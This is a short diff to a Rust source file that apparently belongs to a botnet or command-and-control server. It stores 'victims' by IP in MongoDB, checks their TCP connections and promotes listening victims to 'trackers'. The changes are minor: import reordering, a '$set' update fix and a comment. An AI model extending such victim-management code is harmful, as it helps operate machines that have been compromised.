@@ -1,9 +1,9 @@
 use std::{fmt::Display, net::SocketAddr};
 
-use serde::{Serialize, Deserialize};
-use tokio::{io::{BufReader, AsyncBufReadExt, AsyncWriteExt}, net::TcpStream};
-use mongodb::Collection;
 use mongodb::bson::doc;
+use mongodb::Collection;
+use serde::{Deserialize, Serialize};
+use tokio::{io::{AsyncBufReadExt, AsyncWriteExt, BufReader}, net::TcpStream};
 
 use crate::tracker::is_victim_listening;
 
@@ -32,7 +32,7 @@ pub struct Victim {
 impl Victim {
     pub async fn update_status(&self, victims_collection: &Collection<VictimDb>, status: bool) -> Result<(), Box<dyn std::error::Error>> {
         let filter = doc! { "ip": self.ip.to_string() };
-        let update = doc! { "active": status };
+        let update = doc! { "$set": { "active": status }};
         victims_collection.update_one(filter, update, None).await?;
 
         Ok(())
@@ -73,6 +73,8 @@ pub async fn check_connection(mut stream: &mut TcpStream, current_ip: &SocketAdd
         error!("The client's server responded '{}' instead of 'ready'", buffer);
         return None;
     }
+
+    // The victim only listens if it wants to be a tracker
     if is_victim_listening(&victim).await {
         info!("The victim: {} is listening and will become a tracker", victim.ip);
         victim.victim_type = VictimType::Tracker;
